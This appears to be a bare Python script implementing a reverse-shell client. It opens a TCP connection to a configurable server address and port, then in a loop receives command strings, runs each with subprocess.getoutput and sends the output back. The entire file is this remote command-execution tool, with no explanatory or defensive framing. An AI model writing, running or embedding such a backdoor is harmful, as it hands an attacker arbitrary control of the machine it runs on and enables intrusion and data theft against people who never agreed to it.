import socket
import subprocess

# Define the server's IP address and port
SERVER_HOST = '127.0.0.1'  # Replace with the server's IP address
SERVER_PORT = 12345

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
client_socket.connect((SERVER_HOST, SERVER_PORT))

# Receive commands from the server and execute them
while True:
    # Receive command from server
    command = client_socket.recv(1024).decode()
    if not command:
        break

    # Execute the command and retrieve the output
    output = subprocess.getoutput(command)
    
    # Send the output back to the server
    client_socket.send(output.encode())

# Close the connection
client_socket.close()
